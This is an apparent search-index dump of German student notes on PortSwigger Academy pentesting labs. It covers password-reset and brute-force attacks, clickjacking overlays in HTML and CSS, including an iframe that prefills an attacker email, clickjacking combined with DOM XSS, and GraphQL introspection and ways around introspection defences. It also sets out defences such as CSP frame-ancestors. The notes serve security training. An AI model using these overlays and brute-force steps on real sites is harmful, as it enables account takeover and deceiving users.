/forgot-password?temp-forgot-password-token=5648xegeq98d5bbx5f4a3sjw9rfxbz8d HTTP/2</code> einsetzen mit den anderen n\u00f6tigen Parametern</li> <li>Passwort f\u00fcr <code>carlos</code> auf <code>peter1</code> gesetzt</li> </ol>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Authentication%20vulnerabilities/3.%20Other-Authentication/#lab-password-brute-force-via-password-change","title":"Lab: Password brute-force via password change","text":"<ol> <li>Auch erstmal wieder rumprobieren und schauen welche Funktionen angreifbar sind</li> <li>Wir schauen uns die Funktion an das Passwort zu \u00e4ndern und nach mehrmaligen rumprobieren stellen wir fest, dass wir nicht ausgeloggt werden bei falschem <code>current password</code> wenn wir <code>neues Passwort1</code> und <code>neues Passwort2</code> ungleich haben -&gt; \u00d6ffnet uns T\u00fcren zum bruteforcen</li> <li>Wir laden den POST Request in unseren Turbo Intruder und passen die Parameter an</li> <li>Wir schauen uns an welche Length unterschiedlich ist und probieren das Passwort was dort steht.</li> <li>Erfolgreich eingeloggt</li> </ol>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Authentication%20vulnerabilities/4.%20Best-Practice%20-%20Prevent%20Authentication%20misstakes/","title":"4. Best Practice   Prevent Authentication misstakes","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Authentication%20vulnerabilities/4.%20Best-Practice%20-%20Prevent%20Authentication%20misstakes/#zusammenfassung-schutz-deiner-eigenen-authentifizierung","title":"Zusammenfassung: Schutz deiner eigenen Authentifizierung","text":"<ol> <li> <p>Sch\u00fctze Anmeldedaten konsequent</p> <ul> <li>Vermeide, dass Login-Daten \u00fcber unverschl\u00fcsselte Verbindungen gesendet werden (immer HTTPS erzwingen).</li> <li>Sorge daf\u00fcr, dass Benutzername oder E-Mail nicht versehentlich offengelegt werden \u2013 weder \u00f6ffentlich sichtbar noch in HTTP-Antworten reflektiert.</li> </ul> </li> <li> <p>Verlasse dich nicht auf Nutzer f\u00fcr Sicherheit</p> <ul> <li>Nutzer neigen dazu, Komfort \u00fcber Sicherheit zu w\u00e4hlen. Daher musst du sichere Vorgaben durchsetzen, z. B. eine starke Passwortpolitik.</li> <li>Ein Passwort-Checker, der in Echtzeit Feedback zur Qualit\u00e4t gibt, ist oft effektiver als starre Regeln.</li> </ul> </li> <li> <p>Benutzername-Enth\u00fcllung verhindern (Username Enumeration)</p> <ul> <li>Zeige bei Login-Fehlern keinen Hinweis, ob der Benutzername existiert oder nicht \u2013 gleiche Fehlermeldung f\u00fcr beide F\u00e4lle.</li> <li>Gleicher HTTP Statuscode &amp; \u00e4hnliche Antwortzeiten, um R\u00fcckschl\u00fcsse zu erschweren.</li> </ul> </li> <li> <p>Robuste Brute-Force-Schutzma\u00dfnahmen einf\u00fchren</p> <ul> <li>Rate Limiting (z. B. pro IP, pro Benutzer) &amp; Account Lockout nach mehreren falschen Anmeldeversuchen. Dieses sch\u00fctzt gegen automatisierte Kennwort-Erraterei. OWASP Cheat Sheet Series+1</li> <li>Nutzung von CAPTCHAs, wenn eine bestimmte Fehlversuchsrate erreicht wird. Ebenso Verz\u00f6gerungen oder Sperrzeiten nach mehreren Fehlversuchen.</li> </ul> </li> <li> <p>Verifikation/Validierungslogik (Check-Mechanismen) mehrfach absichern</p> <ul> <li>\u00dcberpr\u00fcfung, dass alle Bedingungen korrekt gepr\u00fcft werden \u2013 z. B. Tokenpr\u00fcfung, Rechtepr\u00fcfung.</li> <li>Kein Schritt darf ausgelassen werden, denn eine Logikl\u00fccke kann die gesamte Absicherung zunichte machen.</li> </ul> </li> <li> <p>Auch Zusatzfunktionen sicher gestalten</p> <ul> <li>Passwort zur\u00fccksetzen, Passwort \u00e4ndern, Konto l\u00f6schen etc. sind genauso kritisch wie Login.</li> <li>Diese Funktionen bieten oft Angriffsfl\u00e4che, wenn man sie vernachl\u00e4ssigt.</li> </ul> </li> <li> <p>Multi-Faktor-Authentifizierung (MFA) nutzen, wenn m\u00f6glich</p> <ul> <li>Ein zus\u00e4tzlicher Faktor neben dem Passwort (z. B. App, Hardware-Token) reduziert deutlich das Risiko. OWASP Cheat Sheet Series</li> <li>Vermeide als alleinigen \u201ezweiten Faktor\u201c Dinge wie SMS oder E-Mail Codes, wenn sie leicht abgefangen werden k\u00f6nnen.</li> <li>Achte darauf, dass auch die 2FA-Logik sauber funktioniert und nicht einfach umgangen werden kann.</li> </ul> </li> </ol>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Clickjacking/1.%20Was%20ist%20Clickjacking/","title":"1. Was ist Clickjacking","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Clickjacking/1.%20Was%20ist%20Clickjacking/#was-ist-clickjacking","title":"Was ist Clickjacking","text":"<p>Clickjacking ist ein UI-basierter Angriff, bei dem ein Nutzer dazu gebracht wird, auf interaktive Inhalte einer versteckten Website zu klicken, w\u00e4hrend er glaubt, auf sichtbare Inhalte einer K\u00f6der-Seite zu klicken. Technisch gesehen wird dabei eine unsichtbare, aber klickbare Seite in einem iframe in die K\u00f6derseite eingebettet. Dieses iframe liegt \u00fcber den erwarteten Inhalten der Seite. Der Angriff unterscheidet sich von CSRF, weil beim Clickjacking der Nutzer aktiv klickt.</p> <p>Warum CSRF-Tokens nicht helfen CSRF-Schutz arbeitet oft mit CSRF-Tokens. Bei Clickjacking ist die Zielsitzung aber echt - Die Inhalte werden von der legitimen Webseite geladen und Anfragen laufen on-domain</p> <p>Wie baut man einen basic Clickjacking Angriff Clickjacking bneutzt CSS um mehere Layer zu erstellen und manipulieren.</p> <pre><code>&lt;head&gt;\n    &lt;style&gt;\n            #target_website { \n                position:relative;\n                width:128px;\n                height:128px;\n                opacity:0.00001;\n                z-index:2; \n                } \n                #decoy_website { \n                position:absolute; \n                width:300px; \n                height:400px; \n                z-index:1; \n                } \n    &lt;/style&gt; \n&lt;/head&gt; ... \n&lt;body&gt; \n    &lt;div id=\"decoy_website\"&gt; \n    ...decoy web content here... \n    &lt;/div&gt; \n    &lt;iframe id=\"target_website\" src=\"https://vulnerable-website.com\"&gt; \n    &lt;/iframe&gt; \n&lt;/body&gt;\n</code></pre>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Clickjacking/1.%20Was%20ist%20Clickjacking/#lab-basic-clickjacking-with-csrf-token-protection","title":"Lab: Basic clickjacking with CSRF token protection","text":"<p>Ziel: Wir sollen einen User dazu bringen seinen Account zu deleten - Wir bauen also eine Baitseite und binden die Target-Seite in einen Iframe wie folgt - Wichtig ist nur, dass der Click Me button mit CSS richtig positioniert wird.</p> <p></p> <p>Das sieht dann wie folgt aus -&gt;. User hat nur ein Click Me dr\u00fcbergelegt bekommen, aber die Session ist trotzdem valide zur Target-Seite weil es in unserem iframe eingebettet ist. </p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Clickjacking/1.%20Was%20ist%20Clickjacking/#clickbandit","title":"Clickbandit","text":"<p>In der Praxis, obwohl es zwar geht, ist es sehr m\u00fchsam ein Clickjacking manuell zu erstellen - Deshalb kommt der Clickbandit ins Spiel. Damit kann man im Browser die gew\u00fcnschten Aktionen auf der einbettbaren Seite ausf\u00fchren - anschlie\u00dfend erzeugt Clickbandit eine HTML-Datei mit einem passenden Clickajcking-Overlay. So l\u00e4sst sich in Sekunden ein interaktives PoC generieren.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Clickjacking/1.%20Was%20ist%20Clickjacking/#clickjacking-with-prefilled-form-input","title":"Clickjacking with prefilled form input","text":"<p>Einige Websites, die das Ausf\u00fcllen und Absenden von Formularen erfordern, erlauben das Vorbef\u00fcllen (Prepopulation) von Formfeldern \u00fcber GET-Parameter vor dem Absenden. Andere Websites verlangen m\u00f6glicherweise Texteingaben, bevor das Formular abgeschickt werden kann. </p> <p>Da GET-Werte Teil der URL sind, kann die Ziel-URL so ver\u00e4ndert werden, dass sie vom Angreifer gew\u00e4hlte Werte enth\u00e4lt. Anschlie\u00dfend wird - wie im grundlegenden Clickjacking-Beispiel - ein transparenter \u201eAbsenden\u201c-Button \u00fcber der K\u00f6der-Seite platziert. So kann das Opfer das Formular mit den vom Angreifer vorgegebenen Daten unbemerkt absenden.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Clickjacking/1.%20Was%20ist%20Clickjacking/#lab-clickjacking-with-form-input-data-prefilled-from-a-url-parameter","title":"Lab: Clickjacking with form input data prefilled from a URL parameter","text":"<ol> <li>Burp Suit Clickbandit</li> <li>E-Mail Feld mit URL Query ausf\u00fcllen <ul> <li><code>&lt;iframe src=\"http://victim.com/my-account?email=attacker%40evil.com\" ...&gt;</code></li> </ul> </li> <li>Copy-Paste Clickbandit Script in Browser Console</li> <li><code>start</code> und Elemente anklicken die wir klicken wollen</li> <li><code>finish</code> um recording von zu klickenden Elementen abzuschlie\u00dfen</li> <li><code>save</code> -&gt; bekommen html file</li> <li>Copy-Paste Inhalt von File in Body teil von Exploit-Server</li> </ol> <p>[!note] Wichtig ist  Dass die URL schon bevor wir auf start dr\u00fccken prepared wird und dann erst mit dem recording beginnen, damit auch der richtige Link im Script landet.!!</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Clickjacking/1.%20Was%20ist%20Clickjacking/#frame-busting-scripts","title":"Frame Busting Scripts","text":"<p>Clientseitige JavaScript-Snippets, die verhindern sollen, dass deine Seite unsichtbar in einem <code>&lt;iframe&gt;</code> eingebettet und \u201edurchgeklickt\u201c wird (Clickjacking). Typische Checks:</p> <ul> <li>Pr\u00fcfen: \u201eBin ich das Top-Fenster?\u201c \u2013 sonst rausnavigieren (<code>top.location = self.location</code>).</li> <li>Alle Frames sichtbar machen / Klicks auf unsichtbare Elemente blocken.</li> <li>Verd\u00e4chtige Zust\u00e4nde melden (Banner/Prompt).</li> </ul> <p>Warum bringt das oft aber nichts? - JS kann aus sein oder vom Browser blockiert werden. - Frame Buster verhalten sich je nach Browser unterschiedlich - Same-Origin-Schutz - iframe sandbox -&gt; Angreifer betten iframe anders sein</p> <p>Best-Practice Die richtige Verteidigung ist, Framing serverseitig zu verbieten/zu steuern \u2013 nicht per JS: 1. CSP <code>frame-ancestors</code> (modern &amp; flexibel)     - Komplett verbieten:         <code>Content-Security-Policy: frame-ancestors 'none';</code>     - Nur gleiche Origin:         <code>Content-Security-Policy: frame-ancestors 'self';</code>     - Partner-Whitelist:         <code>Content-Security-Policy: frame-ancestors 'self' https://partner.example;</code> 2. X-Frame-Options (Legacy, erg\u00e4nzend)     - <code>X-Frame-Options: DENY</code> oder <code>SAMEORIGIN</code></p> <p>Nginx-Schnipsel: </p><pre><code>add_header Content-Security-Policy \"frame-ancestors 'self';\" always;\nadd_header X-Frame-Options \"SAMEORIGIN\" always;\n</code></pre><p></p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Clickjacking/1.%20Was%20ist%20Clickjacking/#lab-clickjacking-with-a-frame-buster-script","title":"Lab: Clickjacking with a frame buster script","text":"<ol> <li>Schritte genau wie oben nur, dass wir Sandbox aktivieren und <code>allow-forms</code> hinzuf\u00fcgen m\u00fcssen damit die Seite framebar wird -&gt; sonst w\u00fcrde das Script anzeigen, dass die Seite nicht framebar ist.  2</li> </ol>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Clickjacking/1.%20Was%20ist%20Clickjacking/#kombiniere-clickjacking-mit-dom-xss-attack","title":"Kombiniere Clickjacking mit DOM XSS attack","text":"<p>Voraussetzung: Es gibt eine DOM-XSS Schwachstelle. Verwendung: XSS-Payload direkt in die URL der eingbetteten Seite packen(im src des iframes)</p> <p>Das Opfer dr\u00fcckt dann auf einen \u00fcberlagerten Button/link und triggert damit die DOM-XSS im eingebetteten Kontext - Clickjacking sorgt daf\u00fcr, dass das Opfer \u201ezielgenau\u201c klickt (UI-Redressing). - DOM-XSS wird durch bestimmte URL-Teile (Query/Hash) clientseitig ausgewertet. - Kombiniert: Der Klick l\u00f6st die Aktion aus, inklusive des XSS-Payloads in der URL.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Clickjacking/1.%20Was%20ist%20Clickjacking/#lab-exploiting-clickjacking-vulnerability-to-trigger-dom-based-xss","title":"Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS","text":"<p>Lab kaputt - geht nicht Aber theoretisch: 1. DOM XSS Schwachstelle finden 2. DOM-XSS Payload und weitere prefilled Inhalte mit Query-Link erstellen 3. Danach mit Clickbandit ein setup erstellen</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Clickjacking/1.%20Was%20ist%20Clickjacking/#multistep-clickjacking","title":"Multistep clickjacking","text":"<p>Beim Multi-Step-Clickjacking braucht der Angreifer mehrere aufeinanderfolgende Nutzeraktionen (z. B. zuerst \u201eIn den Warenkorb\u201c, dann \u201eZur Kasse\u201c, dann \u201eBestellen\u201c). Das l\u00e4sst sich durch mehrere \u00fcberlagerte Divs/iframes umsetzen. Man t\u00e4uscht z. B. \u201eWeiter\u201c, \u201eNoch mal Weiter\u201c, \u201eJetzt gewinnen!\u201c vor - und legst jedes Mal ein anderes (fast unsichtbares) iframe deckungsgleich \u00fcber den decoy-Button.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Clickjacking/1.%20Was%20ist%20Clickjacking/#lab-multistep-clickjacking","title":"Lab: Multistep clickjacking","text":"<p>Lab kaputt - geht nicht Aber theoretisch: </p><pre><code>&lt;style&gt;\n    iframe {\n        position:relative;\n        width:500px;\n        height: 700px;\n        opacity: 0.1;\n        z-index: 2;\n    }\n   .firstClick, .secondClick {\n        position:absolute;\n        top:500px;\n        left:50px;\n        z-index: 1;\n    }\n   .secondClick {\n        top:290px;\n        left:225px;\n    }\n&lt;/style&gt;\n&lt;div class=\"firstClick\"&gt;Test me first&lt;/div&gt;\n&lt;div class=\"secondClick\"&gt;Test me next&lt;/div&gt;\n&lt;iframe src=\"https://0ae500f704a9c699804ca41200ac0017.web-security-academy.net/my-account\"&gt;&lt;/iframe&gt;\n</code></pre><p></p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Clickjacking/2.%20Clickbandit%20-%20Prefilled%20Input%20Clickjacking%20-%20Multistep%20Clickjacking/","title":"2. Clickbandit   Prefilled Input Clickjacking   Multistep Clickjacking","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Clickjacking/2.%20Clickbandit%20-%20Prefilled%20Input%20Clickjacking%20-%20Multistep%20Clickjacking/#clickbandit","title":"Clickbandit","text":"<p>In der Praxis, obwohl es zwar geht, ist es sehr m\u00fchsam ein Clickjacking manuell zu erstellen - Deshalb kommt der Clickbandit ins Spiel. Damit kann man im Browser die gew\u00fcnschten Aktionen auf der einbettbaren Seite ausf\u00fchren - anschlie\u00dfend erzeugt Clickbandit eine HTML-Datei mit einem passenden Clickajcking-Overlay. So l\u00e4sst sich in Sekunden ein interaktives PoC generieren.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Clickjacking/2.%20Clickbandit%20-%20Prefilled%20Input%20Clickjacking%20-%20Multistep%20Clickjacking/#clickjacking-with-prefilled-form-input","title":"Clickjacking with prefilled form input","text":"<p>Einige Websites, die das Ausf\u00fcllen und Absenden von Formularen erfordern, erlauben das Vorbef\u00fcllen (Prepopulation) von Formfeldern \u00fcber GET-Parameter vor dem Absenden. Andere Websites verlangen m\u00f6glicherweise Texteingaben, bevor das Formular abgeschickt werden kann. </p> <p>Da GET-Werte Teil der URL sind, kann die Ziel-URL so ver\u00e4ndert werden, dass sie vom Angreifer gew\u00e4hlte Werte enth\u00e4lt. Anschlie\u00dfend wird - wie im grundlegenden Clickjacking-Beispiel - ein transparenter \u201eAbsenden\u201c-Button \u00fcber der K\u00f6der-Seite platziert. So kann das Opfer das Formular mit den vom Angreifer vorgegebenen Daten unbemerkt absenden.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Clickjacking/2.%20Clickbandit%20-%20Prefilled%20Input%20Clickjacking%20-%20Multistep%20Clickjacking/#lab-clickjacking-with-form-input-data-prefilled-from-a-url-parameter","title":"Lab: Clickjacking with form input data prefilled from a URL parameter","text":"<ol> <li>Burp Suit Clickbandit</li> <li>E-Mail Feld mit URL Query ausf\u00fcllen <ul> <li><code>&lt;iframe src=\"http://victim.com/my-account?email=attacker%40evil.com\" ...&gt;</code></li> </ul> </li> <li>Copy-Paste Clickbandit Script in Browser Console</li> <li><code>start</code> und Elemente anklicken die wir klicken wollen</li> <li><code>finish</code> um recording von zu klickenden Elementen abzuschlie\u00dfen</li> <li><code>save</code> -&gt; bekommen html file</li> <li>Copy-Paste Inhalt von File in Body teil von Exploit-Server</li> </ol> <p>[!note] Wichtig ist  Dass die URL schon bevor wir auf start dr\u00fccken prepared wird und dann erst mit dem recording beginnen, damit auch der richtige Link im Script landet.!!</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Clickjacking/2.%20Clickbandit%20-%20Prefilled%20Input%20Clickjacking%20-%20Multistep%20Clickjacking/#frame-busting-scripts","title":"Frame Busting Scripts","text":"<p>Clientseitige JavaScript-Snippets, die verhindern sollen, dass deine Seite unsichtbar in einem <code>&lt;iframe&gt;</code> eingebettet und \u201edurchgeklickt\u201c wird (Clickjacking). Typische Checks:</p> <ul> <li>Pr\u00fcfen: \u201eBin ich das Top-Fenster?\u201c \u2013 sonst rausnavigieren (<code>top.location = self.location</code>).</li> <li>Alle Frames sichtbar machen / Klicks auf unsichtbare Elemente blocken.</li> <li>Verd\u00e4chtige Zust\u00e4nde melden (Banner/Prompt).</li> </ul> <p>Warum bringt das oft aber nichts? - JS kann aus sein oder vom Browser blockiert werden. - Frame Buster verhalten sich je nach Browser unterschiedlich - Same-Origin-Schutz - iframe sandbox -&gt; Angreifer betten iframe anders sein</p> <p>Best-Practice Die richtige Verteidigung ist, Framing serverseitig zu verbieten/zu steuern \u2013 nicht per JS: 1. CSP <code>frame-ancestors</code> (modern &amp; flexibel)     - Komplett verbieten:         <code>Content-Security-Policy: frame-ancestors 'none';</code>     - Nur gleiche Origin:         <code>Content-Security-Policy: frame-ancestors 'self';</code>     - Partner-Whitelist:         <code>Content-Security-Policy: frame-ancestors 'self' https://partner.example;</code> 2. X-Frame-Options (Legacy, erg\u00e4nzend)     - <code>X-Frame-Options: DENY</code> oder <code>SAMEORIGIN</code></p> <p>Nginx-Schnipsel: </p><pre><code>add_header Content-Security-Policy \"frame-ancestors 'self';\" always;\nadd_header X-Frame-Options \"SAMEORIGIN\" always;\n</code></pre><p></p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Clickjacking/2.%20Clickbandit%20-%20Prefilled%20Input%20Clickjacking%20-%20Multistep%20Clickjacking/#lab-clickjacking-with-a-frame-buster-script","title":"Lab: Clickjacking with a frame buster script","text":"<ol> <li>Schritte genau wie oben nur, dass wir Sandbox aktivieren und <code>allow-forms</code> hinzuf\u00fcgen m\u00fcssen damit die Seite framebar wird -&gt; sonst w\u00fcrde das Script anzeigen, dass die Seite nicht framebar ist.  2</li> </ol>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Clickjacking/2.%20Clickbandit%20-%20Prefilled%20Input%20Clickjacking%20-%20Multistep%20Clickjacking/#kombiniere-clickjacking-mit-dom-xss-attack","title":"Kombiniere Clickjacking mit DOM XSS attack","text":"<p>Voraussetzung: Es gibt eine DOM-XSS Schwachstelle. Verwendung: XSS-Payload direkt in die URL der eingbetteten Seite packen(im src des iframes)</p> <p>Das Opfer dr\u00fcckt dann auf einen \u00fcberlagerten Button/link und triggert damit die DOM-XSS im eingebetteten Kontext - Clickjacking sorgt daf\u00fcr, dass das Opfer \u201ezielgenau\u201c klickt (UI-Redressing). - DOM-XSS wird durch bestimmte URL-Teile (Query/Hash) clientseitig ausgewertet. - Kombiniert: Der Klick l\u00f6st die Aktion aus, inklusive des XSS-Payloads in der URL.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Clickjacking/2.%20Clickbandit%20-%20Prefilled%20Input%20Clickjacking%20-%20Multistep%20Clickjacking/#lab-exploiting-clickjacking-vulnerability-to-trigger-dom-based-xss","title":"Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS","text":"<p>Lab kaputt - geht nicht Aber theoretisch: 1. DOM XSS Schwachstelle finden 2. DOM-XSS Payload und weitere prefilled Inhalte mit Query-Link erstellen 3. Danach mit Clickbandit ein setup erstellen</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Clickjacking/2.%20Clickbandit%20-%20Prefilled%20Input%20Clickjacking%20-%20Multistep%20Clickjacking/#multistep-clickjacking","title":"Multistep clickjacking","text":"<p>Beim Multi-Step-Clickjacking braucht der Angreifer mehrere aufeinanderfolgende Nutzeraktionen (z. B. zuerst \u201eIn den Warenkorb\u201c, dann \u201eZur Kasse\u201c, dann \u201eBestellen\u201c). Das l\u00e4sst sich durch mehrere \u00fcberlagerte Divs/iframes umsetzen. Man t\u00e4uscht z. B. \u201eWeiter\u201c, \u201eNoch mal Weiter\u201c, \u201eJetzt gewinnen!\u201c vor - und legst jedes Mal ein anderes (fast unsichtbares) iframe deckungsgleich \u00fcber den decoy-Button.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Clickjacking/2.%20Clickbandit%20-%20Prefilled%20Input%20Clickjacking%20-%20Multistep%20Clickjacking/#lab-multistep-clickjacking","title":"Lab: Multistep clickjacking","text":"<p>Lab kaputt - geht nicht Aber theoretisch: </p><pre><code>&lt;style&gt;\n    iframe {\n        position:relative;\n        width:500px;\n        height: 700px;\n        opacity: 0.1;\n        z-index: 2;\n    }\n   .firstClick, .secondClick {\n        position:absolute;\n        top:500px;\n        left:50px;\n        z-index: 1;\n    }\n   .secondClick {\n        top:290px;\n        left:225px;\n    }\n&lt;/style&gt;\n&lt;div class=\"firstClick\"&gt;Test me first&lt;/div&gt;\n&lt;div class=\"secondClick\"&gt;Test me next&lt;/div&gt;\n&lt;iframe src=\"https://0ae500f704a9c699804ca41200ac0017.web-security-academy.net/my-account\"&gt;&lt;/iframe&gt;\n</code></pre><p></p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Clickjacking/3.%20Preventing%20Clickjacking%20Attacks/","title":"Wie verhindert man Clickjacking?","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Clickjacking/3.%20Preventing%20Clickjacking%20Attacks/#wie-verhindert-man-clickjacking","title":"Wie verhindert man Clickjacking?","text":"<p>Kernidee: Clientseitige Frame-Buster (JavaScript) sind leicht zu umgehen. Zuverl\u00e4ssig ist serverseitiges Framing-Blocking \u00fcber Browser-Header:</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Clickjacking/3.%20Preventing%20Clickjacking%20Attacks/#1-x-frame-options-legacy-erganzend","title":"1) X-Frame-Options (Legacy, erg\u00e4nzend)","text":"<ul> <li> <p>Komplett verbieten: </p><pre><code>X-Frame-Options: DENY\n</code></pre><p></p> </li> <li> <p>Nur gleiche Origin: </p><pre><code>X-Frame-Options: SAMEORIGIN\n</code></pre><p></p> </li> <li> <p><code>ALLOW-FROM &lt;url&gt;</code> ist inkonsistent/\u00fcberholt (z. B. in Chrome/Safari nicht unterst\u00fctzt). Nutze daf\u00fcr besser CSP <code>frame-ancestors</code>.</p> </li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Clickjacking/3.%20Preventing%20Clickjacking%20Attacks/#2-content-security-policy-empfohlen","title":"2) Content Security Policy (empfohlen)","text":"<p>Mit <code>frame-ancestors</code> steuerst du, wer dich einbetten darf: - Alles verbieten (stark):</p> <p><code>Content-Security-Policy: frame-ancestors 'none';</code> - Nur gleiche Origin:</p> <p><code>Content-Security-Policy: frame-ancestors 'self';</code> - Konkrete Partner erlauben:</p> <p><code>Content-Security-Policy: frame-ancestors 'self' https://partner.example;</code></p> <p><code>frame-ancestors</code> sch\u00fctzt gegen Einbettung in <code>&lt;iframe&gt;</code>, <code>&lt;frame&gt;</code>, <code>&lt;object&gt;</code>, <code>&lt;embed&gt;</code>. F\u00fcr moderne Sites ist CSP die prim\u00e4re Ma\u00dfnahme; XFO kannst du zus\u00e4tzlich setzen (Defense-in-Depth).</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/GraphQL%20API/1.%20Graph%20QL/","title":"1. Graph QL","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/GraphQL%20API/1.%20Graph%20QL/#was-ist-graphql","title":"Was ist GraphQL","text":"<p>Ist eine API mit nur einem Endpunkt. Bisher hatte die API mehrere unterschiedliche Endpunkte, aber hierbei beschr\u00e4nkt man sich auf einen der die diversen Anfragen handhabt.</p> <p>GraphQL Services nutzen oft gleiche Endpunkte-Namen. - <code>/graphql</code> - <code>/api</code> - <code>/api/graphql</code> - <code>/graphql/api</code> - <code>/graphql/graphql</code> - oder zus\u00e4tzlich mit <code>*/v1</code></p> <p>Akzeptiert nur POST requests mit Content-type application/json, hilft gegen CSRF  vulnerabilities. Manchmal werden aber auch alternative methoden akzeptiert wie z. B: <code>x-www-form-urlencoded</code></p> <p>Sobald ein Endpunkt gefunden ist kann man anfangen Querys zu bauen und zu senden.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/GraphQL%20API/1.%20Graph%20QL/#standard-graphql-request","title":"Standard GraphQL-Request","text":"<pre><code>curl -i -X POST https://example.com/graphql \\\n  -H \"Content-Type: application/json\" \\\n  -H \"Authorization: Bearer &lt;token&gt;\" \\\n  -d '{\"query\":\"{ user(id:5){ id name email } }\"}'\n</code></pre> Antwort (vereinfachtes Beispiel): <pre><code>{\n  \"data\": {\n    \"user\": { \"id\": 5, \"name\": \"Peter\", \"email\": \"Peter@htwg.de\" }\n  }\n}\n</code></pre>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/GraphQL%20API/2.%20Discovering%20Schema%20Information/","title":"Was ist Introspection (kurz)","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/GraphQL%20API/2.%20Discovering%20Schema%20Information/#was-ist-introspection-kurz","title":"Was ist Introspection (kurz)","text":"<p>Introspection ist ein eingebautes Feature von GraphQL: der Server kann (sofern aktiviert) das Schema \u00fcber spezielle Felder offenlegen. \u00dcber diese Queries kannst du herausfinden, welche Typen, Queries, Mutations und Felder der Server anbietet \u2014 quasi automatische API-Dokumentation zur Laufzeit.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/GraphQL%20API/2.%20Discovering%20Schema%20Information/#wie-du-gezielt-mutations-namen-abfragst","title":"Wie du gezielt Mutations-Namen abfragst","text":"<p>Du musst nicht das ganze Schema abfragen. Wenn du nur die verf\u00fcgbaren Mutations sehen willst, fragst du das <code>__schema</code>-Feld und dann <code>mutationType</code> \u2192 <code>fields</code> \u2192 <code>name</code>.</p> <p>Beispiel-Query (minimal): </p><pre><code>{\n  __schema {\n    mutationType {\n      fields {\n        name\n      }\n    }\n  }\n}\n</code></pre><p></p> <p>Erkl\u00e4rung: - <code>__schema</code> ist ein spezielles Root-Feld f\u00fcr Introspection. - <code>mutationType</code> verweist auf den Mutation-Root (kann <code>null</code> sein, wenn keine Mutations existieren). - <code>fields { name }</code> listet alle Feldnamen (also die Mutation-Namen).</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/GraphQL%20API/2.%20Discovering%20Schema%20Information/#visualisierung-von-introspection-results","title":"Visualisierung von Introspection results","text":"<p>Mit GraphQL visualizer lassen sich die introspections besser auslesen als raw.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/GraphQL%20API/2.%20Discovering%20Schema%20Information/#suggestions","title":"Suggestions","text":"<p>Wenn Introspection deaktiviert dann k\u00f6nnte man trotzdem mit Suggestions informationen ermitteln. GraphQL-Server schl\u00e4gt dann vor was man meinen k\u00f6nnte.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/GraphQL%20API/3.%20Attack%20API/","title":"3. Attack API","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/GraphQL%20API/3.%20Attack%20API/#suggestions","title":"Suggestions","text":"<p>Wenn Introspection deaktiviert dann k\u00f6nnte man trotzdem mit Suggestions informationen ermitteln. GraphQL-Server schl\u00e4gt dann vor was man meinen k\u00f6nnte.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/GraphQL%20API/3.%20Attack%20API/#wie-ein-angreifer-das-nutzt-idee-in-3-schritten","title":"Wie ein Angreifer das nutzt - Idee in 3 Schritten","text":"<ol> <li>Schicke eine absichtlich falsche Query (z. B. Tippfehler im Feldnamen).</li> <li>Lies die Fehlerantwort: enth\u00e4lt sie Vorschl\u00e4ge, bekommst du valide Feld/Typ-Namen.</li> <li>Wiederhole / automate \u2192 baue so (teilweise) das Schema nach.</li> </ol>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/GraphQL%20API/3.%20Attack%20API/#bypassing-graphql-introspection-defenses","title":"Bypassing GraphQL introspection defenses","text":"<p>Wenn man keine introspection queries laufen lassen kann k\u00f6nnte man versuchen einfach  - nur ein special character hinter 